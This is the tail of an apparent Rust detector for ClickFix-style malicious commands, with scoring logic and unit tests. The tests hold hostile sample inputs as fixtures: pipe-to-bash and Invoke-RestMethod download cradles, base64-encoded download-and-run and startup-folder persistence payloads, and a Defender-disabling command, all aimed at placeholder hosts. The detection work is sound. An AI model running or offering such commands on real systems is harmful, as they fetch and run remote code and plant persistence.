    if !trusted_download_execution && has_download && has_extraction && has_execution {
        findings.push(Finding {
            rule_id: "chain.download-extract-execute".into(),
            title: "Payload downloads, extracts, and executes staged content".into(),
            severity: Severity::Critical,
            score: 45,
            evidence: vec![
                "input contains download, archive extraction, and execution stages".into(),
            ],
        });
    } else if !trusted_download_execution && has_download && has_execution {
        findings.push(Finding {
            rule_id: "chain.download-execute".into(),
            title: "Payload combines remote retrieval with subsequent execution".into(),
            severity: Severity::Critical,
            score: 45,
            evidence: vec!["input contains both download and execution primitives".into()],
        });
    }
    let network_evidence = unique_event_evidence(snapshot, EventKind::NetworkIntent);
    if !network_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "behavior.network-intent".into(),
            title: "Payload attempted network access".into(),
            severity: Severity::Low,
            score: 5,
            evidence: network_evidence,
        });
        if !trusted_download_execution
            && contains_any(&lowercase, &["-encodedcommand", " -enc ", " -e "])
        {
            findings.push(Finding {
                rule_id: "powershell.encoded-remote-command".into(),
                title: "Encoded PowerShell decoded into network-capable code".into(),
                severity: Severity::Critical,
                score: 25,
                evidence: vec![
                    "encoded PowerShell produced a modeled network request after decoding".into(),
                ],
            });
        }
    }

    let process_evidence = unique_event_evidence(snapshot, EventKind::ProcessIntent);
    if !process_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "behavior.child-process".into(),
            title: "Payload attempted to launch a child process".into(),
            severity: Severity::Low,
            score: 5,
            evidence: process_evidence,
        });
    }

    let file_evidence = unique_event_evidence(snapshot, EventKind::FileWrite);
    if !file_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "behavior.file-write".into(),
            title: "Payload created or modified a file".into(),
            severity: Severity::Low,
            score: 3,
            evidence: file_evidence,
        });
    }

    let autorun_evidence = autorun_download_evidence(snapshot);
    if !autorun_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "persistence.autorun-download".into(),
            title: "Network-sourced content was written to a Windows autorun folder".into(),
            severity: Severity::Critical,
            score: 55,
            evidence: autorun_evidence,
        });
    }

    let decode_evidence = unique_event_evidence(snapshot, EventKind::Decode);
    if !decode_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "behavior.decoding".into(),
            title: "Payload decoded or unpacked embedded content".into(),
            severity: Severity::Medium,
            score: 8,
            evidence: decode_evidence,
        });
    }

    let execution_chain_evidence = download_write_execute_evidence(snapshot);
    if !trusted_download_execution && !execution_chain_evidence.is_empty() {
        if let Some(finding) = findings.iter_mut().find(|finding| {
            matches!(
                finding.rule_id.as_str(),
                "chain.download-execute" | "chain.download-extract-execute"
            )
        }) {
            finding.evidence.extend(execution_chain_evidence);
        } else {
            findings.push(Finding {
                rule_id: "chain.download-write-execute".into(),
                title: "Downloaded content was written and then executed".into(),
                severity: Severity::Critical,
                score: 45,
                evidence: execution_chain_evidence,
            });
        }
    }

    let invoke_expression = snapshot.trace.iter().find(|event| {
        event
            .message
            .to_ascii_lowercase()
            .contains("invoke-expression")
    });
    if let Some(event) = invoke_expression.filter(|_| !trusted_download_execution) {
        findings.push(Finding {
            rule_id: "powershell.dynamic-execution".into(),
            title: "Dynamically constructed PowerShell was executed".into(),
            severity: Severity::Critical,
            score: 40,
            evidence: vec![event.message.clone()],
        });
    }

    let persistence_evidence = snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::RegistryWrite)
        .filter(|event| {
            let message = event.message.to_ascii_lowercase();
            message.contains(r"\run") || message.contains(r"\runonce")
        })
        .map(|event| event.message.clone())
        .collect::<Vec<_>>();
    if !persistence_evidence.is_empty() {
        findings.push(Finding {
            rule_id: "behavior.registry-persistence".into(),
            title: "Payload wrote a common autorun registry location".into(),
            severity: Severity::Critical,
            score: 35,
            evidence: persistence_evidence,
        });
    }

    findings
}

fn safe_source_segment_matches(
    input: &str,
    safe_urls: &BTreeSet<String>,
    first_group: &[&str],
    second_group: &[&str],
) -> bool {
    input.split([';', '\n', '\r']).any(|segment| {
        let lowercase = segment.to_ascii_lowercase();
        let has_safe_url = safe_urls
            .iter()
            .any(|url| lowercase.contains(&url.to_ascii_lowercase()));
        has_safe_url
            && (first_group.is_empty() || contains_any(&lowercase, first_group))
            && (second_group.is_empty() || contains_any(&lowercase, second_group))
    })
}

fn add_text_rule(
    findings: &mut Vec<Finding>,
    lowercase_input: &str,
    rule_id: &str,
    title: &str,
    severity: Severity,
    score: u8,
    needles: &[&str],
) {
    let evidence = needles
        .iter()
        .filter(|needle| lowercase_input.contains(**needle))
        .map(|needle| format!("input contains {needle:?}"))
        .collect::<Vec<_>>();
    if !evidence.is_empty() {
        findings.push(Finding {
            rule_id: rule_id.into(),
            title: title.into(),
            severity,
            score,
            evidence,
        });
    }
}

fn contains_any(input: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| input.contains(needle))
}

fn download_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
    let network_sequences = snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::NetworkIntent)
        .map(|event| event.sequence)
        .collect::<Vec<_>>();
    let process_events = snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::ProcessIntent)
        .collect::<Vec<_>>();
    snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::FileWrite)
        .filter_map(|write| {
            let path = write.data.get("path")?;
            if path.is_empty() || !looks_executable(path) {
                return None;
            }
            if !network_sequences
                .iter()
                .any(|sequence| *sequence < write.sequence)
            {
                return None;
            }
            let normalized_path = normalize_for_correlation(path);
            let process = process_events.iter().find(|process| {
                process.sequence > write.sequence
                    && process.data.get("command_line").is_some_and(|command| {
                        normalize_for_correlation(command).contains(&normalized_path)
                    })
            })?;
            Some(format!("{} followed by {}", write.message, process.message))
        })
        .collect::<BTreeSet<_>>()
        .into_iter()
        .take(10)
        .collect()
}

fn autorun_download_evidence(snapshot: &HostSnapshot) -> Vec<String> {
    let network_sequences = snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::NetworkIntent)
        .map(|event| event.sequence)
        .collect::<Vec<_>>();
    snapshot
        .trace
        .iter()
        .filter(|event| event.kind == EventKind::FileWrite)
        .filter_map(|write| {
            let path = write.data.get("path")?.to_ascii_lowercase();
            if !is_autorun_path(&path)
                || !network_sequences
                    .iter()
                    .any(|sequence| *sequence < write.sequence)
            {
                return None;
            }
            Some(write.message.clone())
        })
        .collect::<BTreeSet<_>>()
        .into_iter()
        .take(10)
        .collect()
}

fn is_autorun_path(path: &str) -> bool {
    [
        r"\start menu\programs\startup\",
        r"\windows\system32\tasks\",
        r"\windows\tasks\",
    ]
    .iter()
    .any(|location| path.contains(location))
}

fn looks_executable(path: &str) -> bool {
    [
        ".bat", ".cmd", ".com", ".dll", ".exe", ".hta", ".js", ".jse", ".msi", ".ps1", ".sct",
        ".vbe", ".vbs", ".wsf",
    ]
    .iter()
    .any(|extension| path.to_ascii_lowercase().ends_with(extension))
}

fn normalize_for_correlation(value: &str) -> String {
    let mut normalized = value.to_ascii_lowercase().replace('/', "\\");
    while normalized.contains("\\\\") {
        normalized = normalized.replace("\\\\", "\\");
    }
    normalized
}

fn unique_event_evidence(snapshot: &HostSnapshot, kind: EventKind) -> Vec<String> {
    snapshot
        .trace
        .iter()
        .filter(|event| event.kind == kind)
        .map(|event| event.message.clone())
        .collect::<BTreeSet<_>>()
        .into_iter()
        .take(10)
        .collect()
}

fn summarize_candidate_input(kind: impl Into<String>, bytes: &[u8]) -> InputSummary {
    InputSummary {
        kind: kind.into(),
        size: bytes.len(),
        sha256: Some(sha256_hex(bytes)),
    }
}

fn assess_risk(findings: &[Finding]) -> RiskAssessment {
    let score = findings
        .iter()
        .map(|finding| u16::from(finding.score))
        .sum::<u16>()
        .min(100) as u8;
    let level = match score {
        0 => RiskLevel::None,
        1..=19 => RiskLevel::Low,
        20..=49 => RiskLevel::Medium,
        50..=79 => RiskLevel::High,
        _ => RiskLevel::Critical,
    };
    RiskAssessment { score, level }
}

fn verdict_for_score(score: u8) -> Verdict {
    match score {
        0..=19 => Verdict::Benign,
        20..=49 => Verdict::Suspicious,
        _ => Verdict::Malicious,
    }
}

fn assess_confidence(snapshot: &HostSnapshot) -> Confidence {
    let unsupported_penalty = snapshot.unsupported_operations.saturating_mul(5);
    let limit_penalty = snapshot.limits_reached.saturating_mul(15);
    let empty_artifact_penalty = snapshot
        .artifacts
        .iter()
        .filter(|artifact| artifact.size == 0)
        .count()
        .saturating_mul(10);
    let empty_file_penalty = snapshot
        .virtual_files
        .iter()
        .filter(|file| file.size == 0)
        .count()
        .saturating_mul(5);
    let penalty = unsupported_penalty
        .saturating_add(limit_penalty)
        .saturating_add(empty_artifact_penalty)
        .saturating_add(empty_file_penalty)
        .min(80);
    let score = u8::try_from(100_usize.saturating_sub(penalty)).unwrap_or(20);
    Confidence {
        score,
        completeness: f32::from(score) / 100.0,
        unsupported_operations: snapshot.unsupported_operations,
        limits_reached: snapshot.limits_reached,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;

    #[test]
    fn benign_output_only_script_stays_benign() {
        let report = Detector::default()
            .analyze(DetectorInput::powershell_script(
                "Write-Output 'Your verification code is SAFE-1234'",
            ))
            .unwrap();

        assert_eq!(report.verdict, Verdict::Benign);
        assert_eq!(report.risk.score, 0);
        assert_eq!(report.analysis_status, AnalysisStatus::PrefilterOnly);
    }

    #[test]
    fn thorough_mode_emulates_inputs_skipped_by_the_hot_path() {
        let detector = Detector::default();
        let hot_path = detector
            .analyze(DetectorInput::raw_command("Meeting notes for Friday"))
            .unwrap();
        let thorough = detector
            .analyze_full(DetectorInput::raw_command("Meeting notes for Friday"))
            .unwrap();

        assert_eq!(hot_path.analysis_status, AnalysisStatus::PrefilterOnly);
        assert!(hot_path.input.sha256.is_none());
        assert_eq!(thorough.analysis_status, AnalysisStatus::Emulated);
        assert!(thorough.input.sha256.is_some());
        assert!(!thorough.trace.is_empty());
    }

    #[test]
    fn emulation_errors_produce_partial_reports() {
        let detector = Detector::new(AnalysisLimits {
            max_steps: 0,
            ..AnalysisLimits::default()
        });
        let report = detector
            .analyze_full(DetectorInput::powershell_script(
                "Invoke-WebRequest https://example.invalid/payload",
            ))
            .unwrap();

        assert_eq!(report.analysis_status, AnalysisStatus::Partial);
        assert!(report
            .warnings
            .iter()
            .any(|warning| warning.contains("analysis ended early")));
        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "powershell.download-cradle"));
    }

    #[test]
    fn encoded_network_chain_is_malicious_and_explainable() {
        let script = "$x='SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL3BheWxvYWQn'; iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))";
        let report = Detector::default()
            .analyze(DetectorInput::powershell_script(script))
            .unwrap();

        assert_eq!(report.verdict, Verdict::Malicious);
        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "behavior.network-intent"));
        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "powershell.dynamic-execution"));
    }

    #[test]
    fn risk_and_confidence_are_independent() {
        let report = Detector::default()
            .analyze(DetectorInput::powershell_script(
                "powershell.exe -Command Unknown-ClickFixCommand 'https://example.invalid/a'",
            ))
            .unwrap();

        assert!(report.risk.score > 0);
        assert!(report.confidence.score < 100);
    }

    #[test]
    fn ordinary_local_windows_launchers_are_not_suspicious_on_name_alone() {
        for command in [
            r"msiexec.exe /i C:\Packages\approved.msi",
            r"rundll32.exe shell32.dll,Control_RunDLL",
            "conhost.exe",
        ] {
            let report = Detector::default()
                .analyze(DetectorInput::raw_command(command))
                .unwrap();
            assert_eq!(report.verdict, Verdict::Benign, "{command}");
        }
    }

    #[test]
    fn headless_conhost_download_extract_execute_chain_is_malicious() {
        // Defanged: c[o]n[h]o[s]t[.]exe --headless c[m]d /c "... c[u]rl hXXps[:]//example[.]invalid/... t[a]r ... r[u]n[d]l[l]32 ..."
        let payload = String::from_utf8(
            base64::engine::general_purpose::STANDARD
                .decode("IkM6XFdpbmRvd3NcU3lzdGVtMzJcY29uaG9zdC5leGUiIC0taGVhZGxlc3MgY21kIC9jICJta2RpciBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2UgJiBjdXJsLmV4ZSAtbyBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2VccGF5bG9hZC56aXAgaHR0cHM6Ly9leGFtcGxlLmludmFsaWQvcGF5bG9hZC56aXAgJiB0YXIuZXhlIC14ZiBDOlxVc2Vyc1xQdWJsaWNcc3RhZ2VccGF5bG9hZC56aXAgLUMgQzpcVXNlcnNcUHVibGljXHN0YWdlICYgcnVuZGxsMzIuZXhlIEM6XFVzZXJzXFB1YmxpY1xzdGFnZVxwYXlsb2FkLmRsbCxTdGFydCI=")
                .unwrap(),
        )
        .unwrap();
        let report = Detector::default()
            .analyze(DetectorInput::raw_command(payload))
            .unwrap();

        assert_eq!(report.verdict, Verdict::Malicious);
        for rule in [
            "launcher.headless-conhost",
            "behavior.network-intent",
            "behavior.child-process",
            "behavior.file-write",
        ] {
            assert!(
                report
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == rule),
                "missing finding {rule}"
            );
        }
    }

    #[test]
    fn download_to_startup_folder_is_malicious_persistence() {
        // Defanged: IWR hXXps[:]//example[.]invalid/update[.]cmd -OutFile C[:]\...\Start Menu\Programs\Startup\update[.]cmd
        let payload = String::from_utf8(
            base64::engine::general_purpose::STANDARD
                .decode("SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL2V4YW1wbGUuaW52YWxpZC91cGRhdGUuY21kIC1PdXRGaWxlICdDOlxVc2Vyc1xhbmFseXNpc1xBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXHVwZGF0ZS5jbWQn")
                .unwrap(),
        )
        .unwrap();
        let report = Detector::default()
            .analyze(DetectorInput::powershell_script(payload))
            .unwrap();

        assert_eq!(report.verdict, Verdict::Malicious);
        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "persistence.autorun-download"));
    }

    #[test]
    fn configured_safe_source_suppresses_download_execute_chain() {
        let payload = r#"curl -fsSL https://gh.io/copilot-install | VERSION="v0.0.369" PREFIX="$HOME/custom" bash"#;
        let report = Detector::default()
            .analyze(DetectorInput::raw_command(payload))
            .unwrap();

        assert_eq!(report.verdict, Verdict::Benign);
        assert_eq!(report.safe_network_urls, ["https://gh.io/copilot-install"]);
        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "source.safe-network"));
        assert!(!report
            .findings
            .iter()
            .any(|finding| finding.rule_id.starts_with("chain.")));
    }

    #[test]
    fn safe_network_activity_does_not_suppress_unrelated_dynamic_execution() {
        let payload = "iex 'Write-Output local'; Invoke-RestMethod 'https://gh.io/copilot-install'";
        let report = Detector::default()
            .analyze(DetectorInput::powershell_script(payload))
            .unwrap();

        assert!(report
            .findings
            .iter()
            .any(|finding| finding.rule_id == "powershell.dynamic-execution"));
    }

    #[test]
    fn safe_source_matching_rejects_lookalikes_and_mixed_sources() {
        let lookalike = Detector::default()
            .analyze(DetectorInput::raw_command(
                "curl -fsSL https://gh.io.evil.invalid/copilot-install | bash",
            ))
            .unwrap();
        assert_eq!(lookalike.verdict, Verdict::Malicious);
        assert!(lookalike.safe_network_urls.is_empty());

        let mixed = Detector::default()
            .analyze(DetectorInput::powershell_script(
                "iex (irm 'https://gh.io/copilot-install'); iex (irm 'https://example.invalid/other')",
            ))
            .unwrap();
        assert_eq!(mixed.verdict, Verdict::Malicious);
        assert_eq!(mixed.safe_network_urls, ["https://gh.io/copilot-install"]);
    }

    #[test]
    fn safe_source_prefix_is_constrained_to_origin_and_path() {
        let mut policy = SafeSourcePolicy::empty();
        policy
            .add_url_prefix("https://downloads.example.invalid/releases/")
            .unwrap();

        assert!(policy.is_safe("https://downloads.example.invalid/releases/v1/tool.zip"));
        assert!(!policy.is_safe("https://downloads.example.invalid/other/tool.zip"));
        assert!(!policy.is_safe("https://downloads.example.invalid.evil/releases/tool.zip"));
    }

    #[test]
    fn prefilter_skips_plain_and_multiline_prose_without_hashing() {
        for content in [
            "hello",
            "Meeting notes for Friday: review the quarterly roadmap.",
            "Meeting notes\nReview the roadmap\nSend comments\nThank you",
            "https://example.com/documentation",
        ] {
            let prefilter = Detector::prefilter(content);
            assert_eq!(
                prefilter.decision,
                PrefilterDecision::DefinitelyBenign,
                "{content:?}"
            );
            let report = Detector::default()
                .analyze(DetectorInput::raw_command(content))
                .unwrap();
            assert_eq!(report.verdict, Verdict::Benign);
            assert!(report.input.sha256.is_none());
            assert!(report.trace.is_empty());
            assert_eq!(
                report.prefilter.decision,
                PrefilterDecision::DefinitelyBenign
            );
        }
    }

    #[test]
    fn prefilter_identifies_clickfix_candidate_signals() {
        for content in [
            "mshta.exe https://example.invalid/fix",
            "powershell.exe -EncodedCommand QQ==",
            "curl https://example.invalid/a | bash",
            r"rundll32.exe \\example.invalid\share\stage.dll,Start",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d payload",
            "msbuild payload.xml",
            "&('i'+'ex') 'Write-Output test'",
        ] {
            assert_eq!(
                Detector::prefilter(content).decision,
                PrefilterDecision::Candidate,
                "{content:?}"
            );
        }
        assert_eq!(
            Detector::prefilter(&"A".repeat(160)).decision,
            PrefilterDecision::Candidate
        );
    }

    #[test]
    fn prefilter_differentially_covers_known_non_benign_inputs() {
        let cases = [
            DetectorInput::raw_command("mshta https://example.invalid/fix"),
            DetectorInput::raw_command("curl https://example.invalid/payload | bash"),
            DetectorInput::raw_command("msiexec /i https://example.invalid/package.msi /quiet"),
            DetectorInput::powershell_script(
                "iex (Invoke-RestMethod 'https://example.invalid/stage')",
            ),
        ];

        for input in cases {
            let prefilter = Detector::prefilter(&input.content);
            let report = Detector::default().analyze_full(input).unwrap();
            assert_ne!(report.verdict, Verdict::Benign);
            assert_eq!(prefilter.decision, PrefilterDecision::Candidate);
        }
    }

    #[test]
    fn oversized_input_is_rejected_before_hashing() {
        let input = "A".repeat(MAX_DETECTOR_INPUT_BYTES + 1);
        assert_eq!(
            Detector::prefilter(&input).decision,
            PrefilterDecision::Oversized
        );
        assert!(matches!(
            Detector::default().analyze(DetectorInput::raw_command(input)),
            Err(DetectorError::InputTooLarge)
        ));
    }
}
